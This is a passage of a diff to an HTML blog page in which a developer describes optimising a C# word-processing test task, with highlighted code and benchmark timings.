+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">else</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">foreach</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">word</span> <span class="normal">in</span> <span class="normal">_words</span><span class="special-char">[</span><span class="normal">wordLength</span><span class="special-char">]</span><span class="special-char">.</span><span class="normal">Keys</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">reversedWord</span> <span class="special-char">=</span> <span class="method">Reverse</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">for</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">counter</span> <span class="special-char">=</span> <span class="normal">0</span><span class="special-char">;</span> <span class="normal">counter</span> <span class="special-char">&lt;</span> <span class="normal">_words</span><span class="special-char">[</span><span class="normal">wordLength</span><span class="special-char">]</span><span class="special-char">[</span><span class="normal">word</span><span class="special-char">]</span><span class="special-char">;</span> <span class="normal">counter</span><span class="special-char">+</span><span class="special-char">+</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">resultBuilder</span><span class="special-char">.</span><span class="method">Append</span><span class="special-char">(</span><span class="normal">reversedWord</span><span class="special-char">)</span><span class="special-char">.</span><span class="method">Append</span><span class="special-char">(</span><span class="string"><span class="special-char">"</span> <span class="special-char">"</span></span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">result</span> <span class="special-char">=</span> <span class="normal">resultBuilder</span><span class="special-char">.</span><span class="method">ToString</span><span class="special-char">(</span><span class="normal">0</span><span class="special-char">,</span> <span class="normal">resultBuilder</span><span class="special-char">.</span><span class="normal">Length</span> <span class="special-char">-</span> <span class="normal">1</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">result</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="decl">void</span> <span class="method">AddWord</span><span class="special-char">(</span><span class="decl">string</span> <span class="normal">word</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="method">EnsureWordLength</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">.</span><span class="normal">Length</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">_words</span><span class="special-char">[</span><span class="normal">word</span><span class="special-char">.</span><span class="normal">Length</span><span class="special-char">]</span><span class="special-char">.</span><span class="method">ContainsKey</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_words</span><span class="special-char">[</span><span class="normal">word</span><span class="special-char">.</span><span class="normal">Length</span><span class="special-char">]</span><span class="special-char">[</span><span class="normal">word</span><span class="special-char">]</span><span class="special-char">+</span><span class="special-char">+</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">else</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_words</span><span class="special-char">[</span><span class="normal">word</span><span class="special-char">.</span><span class="normal">Length</span><span class="special-char">]</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">,</span> <span class="normal">1</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="decl">void</span> <span class="method">EnsureWordLength</span><span class="special-char">(</span><span class="decl">int</span> <span class="normal">wordLength</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">while</span> <span class="special-char">(</span><span class="normal">_words</span><span class="special-char">.</span><span class="normal">Count</span> <span class="special-char">&lt;</span><span class="special-char">=</span> <span class="normal">wordLength</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_words</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="decl">new</span> <span class="class">Dictionary</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">,</span> <span class="decl">int</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="class">StringComparer</span><span class="special-char">.</span><span class="normal">OrdinalIgnoreCase</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="decl">string</span> <span class="method">Reverse</span><span class="special-char">(</span><span class="decl">string</span> <span class="normal">str</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">str</span><span class="special-char">.</span><span class="normal">Length</span> <span class="special-char">=</span><span class="special-char">=</span> <span class="normal">1</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">str</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="decl">new</span> <span class="class">String</span><span class="special-char">(</span><span class="normal">str</span><span class="special-char">.</span><span class="method">Reverse</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">.</span><span class="method">ToArray</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"><span class="special-char">}</span></span>
+                                </code>
+                            </p>
                             <p><span><i>I don't think it's possible to tell how I did come to this implementation.</i></span></p>
                             <p><span>First, the performance: 640 ms (-20%) (without <code>Stopwatches</code>)</span></p>
                             <p><span>Next, the test task does not mention anything about same length words ordering, so different solutions can return different results - and this is absolutely valid, and this is the case with this new one. I had to change my self-tests to avoid false failures. <i>I'll not add another performance-decreasing OrderBy\ThenBy to make it deterministic without explicit requirement, no-no-no.</i></span></p>
                             <p class="sub-title">
-                                <h3>The slow parts:</h3></pclass="sub-title">
-                                <ul>
-                                    <li><p><span><code>Consts.Separators.Contains</code> (<code>Separators</code> is a 20 chars array).</span></p></li>
-                                    <li><p><span>First <code>StringBuilder</code> (<code>var wordBuilder</code>) operations.</span></p></li>
-                                    <li><p><span>AddWord method. <i>Expected.</i></span></p></li>
-                                </ul>
+                                <h3>The slow parts:</h3>
+                            </p>
+                            <ul>
+                                <li><p><span><code>Consts.Separators.Contains</code> (<code>Separators</code> is a 20 chars array).</span></p></li>
+                                <li><p><span>First <code>StringBuilder</code> (<code>var wordBuilder</code>) operations.</span></p></li>
+                                <li><p><span>AddWord method. <i>Expected.</i></span></p></li>
+                            </ul>
                         </div>
                         <div class="sub-title"><h2>Experiment</h2></div>
                         <div>
                             <p><span>Using an array to store the separators was a good idea, since this is the right type for <code>String.Split</code>. But I don't have <code>String.Split</code> anymore...</span></p>
-                            <p><span><code class="code-block"></code></span></p>
-                            <p><span><code class="code-block"></code></span></p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="decl">internal</span> <span class="decl">static</span> <span class="decl">class</span> <span class="class">Consts</span></span>
+                                    <br /><span class="line"><span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">public</span> <span class="decl">static</span> <span class="decl">char</span><span class="special-char">[</span><span class="special-char">]</span> <span class="normal">Separators</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="decl">char</span><span class="special-char">[</span><span class="special-char">]</span> <span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="string"><span class="special-char">'</span> <span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>.<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>,<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>;<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>:<span class="special-char">'</span></span><span class="special-char">,</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="string"><span class="special-char">'</span>!<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>?<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>(<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>)<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span><span class="escape"><span class="special-char">\n</span></span><span class="special-char">'</span></span><span class="special-char">,</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="string"><span class="special-char">'</span><span class="escape"><span class="special-char">\r</span></span><span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span><span class="special-char">"</span><span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>-<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>”<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>“<span class="special-char">'</span></span><span class="special-char">,</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="string"><span class="special-char">'</span>’<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>‘<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>*<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>—<span class="special-char">'</span></span><span class="special-char">,</span> <span class="string"><span class="special-char">'</span>•<span class="special-char">'</span></span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">public</span> <span class="decl">static</span> <span class="class">List</span><span class="special-char">&lt;</span><span class="decl">char</span><span class="special-char">&gt;</span> <span class="normal">SeparatorsList</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">List</span><span class="special-char">&lt;</span><span class="decl">char</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="normal">Separators</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">public</span> <span class="decl">static</span> <span class="class">HashSet</span><span class="special-char">&lt;</span><span class="decl">char</span><span class="special-char">&gt;</span> <span class="normal">SeparatorsHashSet</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">HashSet</span><span class="special-char">&lt;</span><span class="decl">char</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="normal">Separators</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">public</span> <span class="decl">static</span> <span class="decl">bool</span> <span class="method">IsSeparator</span><span class="special-char">(</span><span class="decl">char</span> <span class="normal">chr</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">chr</span> <span class="special-char">=</span><span class="special-char">=</span> <span class="string"><span class="special-char">'</span> <span class="special-char">'</span></span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="decl">true</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"><span class="special-char">//</span>repeat 20 times</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="decl">false</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"><span class="special-char">}</span></span>
+                                </code>
+                            </p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="decl">var</span> <span class="normal">isSeparator</span> <span class="special-char">=</span> <span class="class">Consts</span><span class="special-char">.</span><span class="normal">SeparatorsList</span><span class="special-char">.</span><span class="method">Contains</span><span class="special-char">(</span><span class="normal">chr</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                </code>
+                            </p>
                             <p><span>The 20-ifs approach (with == and <code>Equals</code>) didn't improve anything at all. <i>A bit surprised here.</i></span></p>
                             <p><span>Neither did the <code>HashSet</code>. <i>Expected, the collection is too small.</i></span></p>
                             <p><span>Using the <code>List</code> did the trick, and now I'm at 530 ms (-17%). <i>Surprised, List.Contains is faster than Array.Contains...</i></span></p>
@@ -2060,7 +2494,35 @@
                         <div class="sub-title"><h2>Experiment more...</h2></div>
                         <div>
                             <p><span><code>StringBuilders</code> are great, but I need something simpler. Like an array.</span></p>
-                            <p><span><code class="code-block"></code></span></p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="decl">var</span> <span class="normal">wordBuilder</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="decl">char</span><span class="special-char">[</span><span class="normal">100</span><span class="special-char">]</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"><span class="decl">var</span> <span class="normal">wordBuilderIndex</span> <span class="special-char">=</span> <span class="normal">0</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"><span class="stmnt">foreach</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">chr</span> <span class="normal">in</span> <span class="normal">input</span><span class="special-char">)</span></span>
+                                    <br /><span class="line"><span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">isSeparator</span> <span class="special-char">=</span> <span class="normal">Consts</span><span class="special-char">.</span><span class="normal">SeparatorsList</span><span class="special-char">.</span><span class="method">Contains</span><span class="special-char">(</span><span class="normal">chr</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">isSeparator</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">wordBuilderIndex</span> <span class="special-char">!</span><span class="special-char">=</span> <span class="normal">0</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">word</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">String</span><span class="special-char">(</span><span class="normal">wordBuilder</span><span class="special-char">,</span> <span class="normal">0</span><span class="special-char">,</span> <span class="normal">wordBuilderIndex</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="method">AddWord</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">wordBuilderIndex</span> <span class="special-char">=</span> <span class="normal">0</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">else</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">wordBuilder</span><span class="special-char">[</span><span class="normal">wordBuilderIndex</span><span class="special-char">]</span> <span class="special-char">=</span> <span class="normal">chr</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">wordBuilderIndex</span><span class="special-char">+</span><span class="special-char">+</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"><span class="special-char">}</span></span>
+                                    <br /><span class="line"><span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">wordBuilderIndex</span> <span class="special-char">!</span><span class="special-char">=</span> <span class="normal">0</span><span class="special-char">)</span></span>
+                                    <br /><span class="line"><span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">word</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">String</span><span class="special-char">(</span><span class="normal">wordBuilder</span><span class="special-char">,</span> <span class="normal">0</span><span class="special-char">,</span> <span class="normal">wordBuilderIndex</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="method">AddWord</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"><span class="special-char">}</span></span>
+                                </code>
+                            </p>
                             <p><span>10-15ms faster (-3%), barely noticeable. And puts this weird limit on the word length. <i>Not a problem for now, changing 100 to 10000 doesn't seem to affect timing.</i></span></p>
                         </div>
                     </div>
@@ -2072,13 +2534,14 @@
                         <div>
                             <p><span>So, now I have a 520 ms implementation. Not as readable as the previous one, but 35% faster. <br />Or not? </span></p>
                             <p class="sub-title">
-                                <h3>I repeated my tests with a 135MB text file ("War and Peace" x40) as input:</h3></pclass="sub-title">
-                                <ul>
-                                    <li><p><span>List-based solution (the first one): Didn't test as it would take too long.</span></p></li>
-                                    <li><p><span>HashSet-based solution: 5000 ms.</span></p></li>
-                                    <li><p><span>List of Dictionaries solution (with StringBuilder): 4050 ms (-20%)</span></p></li>
-                                    <li><p><span>List of Dictionaries solution (with char array): 3840 ms (-5%)</span></p></li>
-                                </ul>
+                                <h3>I repeated my tests with a 135MB text file ("War and Peace" x40) as input:</h3>
+                            </p>
+                            <ul>
+                                <li><p><span>List-based solution (the first one): Didn't test as it would take too long.</span></p></li>
+                                <li><p><span>HashSet-based solution: 5000 ms.</span></p></li>
+                                <li><p><span>List of Dictionaries solution (with StringBuilder): 4050 ms (-20%)</span></p></li>
+                                <li><p><span>List of Dictionaries solution (with char array): 3840 ms (-5%)</span></p></li>
+                            </ul>
                             <p><span><i>At least the later versions are faster!</i></span></p>
                             <p class="sub-title"><h3>And then with an input where all the "words" are unique and have the same length (GUIDs), about the same input length as above:</h3></p>
                             <ul>
@@ -2101,8 +2564,48 @@
                         <p><span><i>I spent 4 or 5 hours on this task already (1 hour for the HashSet implementation and another 4 hours for the final "List of Dictionaries" version). This is more than I'm ready to spend on a test task...</i></span></p>
                         <p><span><i>No ideas for further improvements.</i></span></p>
                         <p><span><i>Wait...</i></span></p>
-                        <p><span><code class="code-block"></code></span></p>
+                        <p>
+                            <code class="code-block csharp">
+                                <span class="line"><span class="decl">internal</span> <span class="decl">class</span> <span class="class">TestTask_GPT</span> <span class="special-char">:</span> <span class="class">ITestTask</span></span>
+                                <br /><span class="line"><span class="special-char">{</span> </span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">public</span> <span class="decl">string</span> <span class="method">Run</span><span class="special-char">(</span><span class="decl">string</span> <span class="normal">input</span><span class="special-char">)</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"><span class="special-char">//</span> Split the sentence into words</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">words</span> <span class="special-char">=</span> <span class="normal">input</span><span class="special-char">.</span><span class="method">Split</span><span class="special-char">(</span><span class="normal">Consts</span><span class="special-char">.</span><span class="normal">Separators</span><span class="special-char">,</span> <span class="class">StringSplitOptions</span><span class="special-char">.</span><span class="normal">RemoveEmptyEntries</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                <br /><span class="line"></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"><span class="special-char">//</span> List to store the transformed words</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="class">List</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">&gt;</span> <span class="normal">transformedWords</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">List</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                <br /><span class="line"></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"><span class="special-char">//</span> HashSet to track words with even length to remove duplicates</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="class">HashSet</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">&gt;</span> <span class="normal">seenEvenWords</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">HashSet</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                <br /><span class="line"></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">foreach</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">word</span> <span class="normal">in</span> <span class="normal">words</span><span class="special-char">)</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
